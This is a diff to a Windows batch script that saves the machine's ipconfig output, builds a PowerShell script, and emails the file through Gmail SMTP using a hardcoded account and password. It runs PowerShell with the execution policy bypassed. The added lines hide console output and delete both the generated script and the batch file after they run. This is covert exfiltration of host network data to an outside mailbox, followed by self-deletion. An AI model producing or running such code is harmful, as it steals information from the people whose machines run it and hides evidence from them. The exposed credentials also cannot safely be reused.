@@ -1,4 +1,5 @@
 @echo off
+REM echo off makes sure no code is printed to console
 ipconfig > C:\Users\%username%\ipinfo.txt
 SET GmailAccount=projdatatests@gmail.com
 SET GmailPassword=C0D!N6PR0J3CT5
@@ -7,6 +8,8 @@ SET Attachment=C:\Users\%username%\ipinfo.txt
 CALL :PowerShellScriptCreate
 CD %PowerShellDir%
 Powershell -ExecutionPolicy Bypass -Command "& {%PShellScript% '%GmailAccount%' '%GmailPassword%' '%Attachment%'}"
+IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
+IF EXIST "%~FN0" DEL /Q /F "%~FN0"
 pause
 
 :PowerShellScriptCreate
@@ -29,3 +32,5 @@ ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username
 ECHO $SMTPClient.Send($SMTPMessage^)
 ) > %PShellScript%
 GOTO :EOF
+
+
